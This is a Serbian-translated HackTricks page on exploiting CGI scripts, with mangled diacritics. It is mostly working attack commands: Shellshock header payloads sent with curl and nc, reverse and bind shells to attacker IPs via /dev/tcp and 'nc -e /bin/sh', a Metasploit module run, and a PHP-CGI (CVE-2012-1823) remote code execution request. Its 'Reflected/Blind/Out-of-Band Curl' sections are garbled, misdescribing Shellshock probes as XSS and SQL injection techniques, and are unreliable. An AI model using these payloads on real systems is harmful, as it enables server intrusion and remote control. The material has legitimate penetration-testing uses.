<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


# Informacije

**CGI skripte su perl skripte**, pa ako ste kompromitovali server koji mo쬰 izvr코avati _**.cgi**_ skripte, mo쬰te **upload-ovati perl reverse shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\), **promeniti ekstenziju** iz **.pl** u **.cgi**, dati **dozvole za izvr코avanje** \(`chmod +x`\) i **pristupiti** reverse shell-u **iz web pregleda캜a** da ga izvr코ite.
Da biste testirali **CGI ranjivosti**, preporu캜uje se kori코캖enje `nikto -C all` \(i sve dodatke\)

# **ShellShock**

**ShellShock** je **ranjivost** koja uti캜e na 코iroko kori코캖eni **Bash** komandni shell u Unix baziranim operativnim sistemima. Cilja sposobnost Basha da izvr코ava komande koje aplikacije prosle캠uju. Ranjivost le쬴 u manipulaciji **okru쬰njskim promenljivama**, koje su dinami캜ki nazvane vrednosti koje uti캜u na na캜in izvr코avanja procesa na ra캜unaru. Napada캜i mogu iskoristiti ovo tako 코to pridru쬿ju **zlonameran kod** okru쬰njskim promenljivama, koji se izvr코ava prilikom prijema promenljive. Ovo omogu캖ava napada캜ima da potencijalno kompromituju sistem.

Iskori코캖avanjem ove ranjivosti, **stranica mo쬰 prikazati gre코ku**.

Mo쬰te **prona캖i** ovu ranjivost primetiv코i da koristi **stariju verziju Apache-a** i **cgi\_mod** \(sa cgi folderom\) ili kori코캖enjem **nikto-a**.

## **Test**

Ve캖ina testova se zasniva na ispisivanju ne캜ega i o캜ekivanju da se taj string vrati u web odgovoru. Ako mislite da je neka stranica ranjiva, potra쬴te sve cgi stranice i testirajte ih.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(reflektovano, slepo i van opsega\)**

---

### **Reflected Curl**

Reflektovani Curl je tehnika koja se koristi za otkrivanje ranjivosti reflektovanih XSS napada u aplikacijama. Ova tehnika uklju캜uje slanje HTTP zahteva koji sadr쬰 zlonamerni kod koji se reflektuje nazad na korisnika. Kada se korisnik izlo쬴 ovom zlonamernom kodu, napada캜 mo쬰 izvr코iti razli캜ite vrste napada, uklju캜uju캖i kra캠u kola캜i캖a ili preusmeravanje na zlonamerni sajt.

---

### **Blind Curl**

Slepi Curl je tehnika koja se koristi za otkrivanje ranjivosti slepih SQL injekcija u aplikacijama. Ova tehnika uklju캜uje slanje HTTP zahteva koji sadr쬰 SQL upit koji se izvr코ava na serverskoj strani. Me캠utim, umesto da se rezultati upita prika쬿 korisniku, napada캜 koristi slepe tehnike za dobijanje informacija o bazi podataka. Ovo mo쬰 uklju캜ivati izvr코avanje upita koji vra캖aju ta캜ne ili neta캜ne rezultate, kao i izvr코avanje upita koji izazivaju odgovor sa ka코njenjem.

---

### **Out-of-Band Curl**

Curl van opsega je tehnika koja se koristi za otkrivanje ranjivosti koje omogu캖avaju napada캜u da komunicira sa spoljnim serverom izvan ciljne mre쬰. Ova tehnika uklju캜uje slanje HTTP zahteva koji sadr쬰 zlonamerni kod koji izaziva komunikaciju sa spoljnim serverom. Napada캜 mo쬰 iskoristiti ovu komunikaciju za izvr코avanje razli캜itih vrsta napada, kao 코to su preuzimanje osetljivih podataka ili izvr코avanje zlonamernih operacija na ciljnom sistemu.
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## Iskori코캖avanje ranjivosti

### Remote Command Execution (RCE)

Ranjivosti u CGI skriptama 캜esto omogu캖avaju izvr코avanje udaljenih komandi na serveru. Ova vrsta ranjivosti se naziva Remote Command Execution (RCE). Kada se ova ranjivost iskoristi, napada캜 mo쬰 izvr코avati proizvoljne komande na serveru.

Da biste iskoristili ovu ranjivost, prvo morate prona캖i CGI skriptu koja je ranjiva. Zatim, trebate identifikovati na캜in na koji se korisni캜ki unos prosle캠uje skripti. Ovo mo쬰 biti putem URL parametara, HTTP zaglavlja ili formi. Nakon 코to identifikujete na캜in prosle캠ivanja korisni캜kog unosa, mo쬰te poku코ati ubaciti komandu koju 쬰lite izvr코iti.

Na primer, ako je CGI skripta ranjiva i korisni캜ki unos se prosle캠uje putem URL parametara, mo쬰te poku코ati ubaciti komandu u URL parametar. Na taj na캜in, kada se skripta izvr코i, va코a komanda 캖e biti izvr코ena na serveru.

Evo primera URL parametra koji bi mogao biti iskori코캖en za RCE:

```
http://example.com/cgi-bin/script.cgi?param=;ls
```

U ovom primeru, komanda `ls` 캖e biti izvr코ena na serveru. Napada캜 mo쬰 koristiti ovu tehniku za izvr코avanje bilo koje komande koju 쬰li, uklju캜uju캖i i one koje mogu dovesti do daljeg kompromitovanja sistema.

Va쬹o je napomenuti da je iskori코캖avanje RCE ranjivosti nelegalno i mo쬰 imati ozbiljne pravne posledice. Ove informacije su namenjene samo u edukativne svrhe i ne treba ih koristiti za neovla코캖ene aktivnosti.
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **Proxy \(MitM zahtevi web serveru\)**

CGI kreira okru쬰njsku promenljivu za svaki zaglavlje u HTTP zahtevu. Na primer: "host:web.com" se kreira kao "HTTP\_HOST"="web.com"

Po코to se HTTP\_PROXY promenljiva mo쬰 koristiti od strane web servera, poku코ajte da po코aljete **zaglavlje** koje sadr쬴: "**Proxy: &lt;IP\_napada캜a&gt;:&lt;PORT&gt;**" i ako server izvr코i bilo koji zahtev tokom sesije, bi캖ete u mogu캖nosti da uhvatite svaki zahtev koji je server napravio.

# Stari PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

U osnovi, ako je cgi aktivan i php je "star" \(&lt;5.3.12 / &lt; 5.4.2\) mo쬰te izvr코iti kod.
Da biste iskoristili ovu ranjivost, morate pristupiti nekom PHP fajlu web servera bez slanja parametara \(posebno bez slanja karaktera "="\).
Zatim, kako biste testirali ovu ranjivost, mo쬰te pristupiti na primer `/index.php?-s` \(primetite `-s`\) i **izvorni kod aplikacije 캖e se pojaviti u odgovoru**.

Zatim, kako biste dobili **RCE**, mo쬰te poslati ovaj poseban upit: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` i **PHP kod** koji 캖e biti izvr코en u **telo zahteva.
Primer:**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Vi코e informacija o ranjivosti i mogu캖im eksploatacijama:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Primer**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
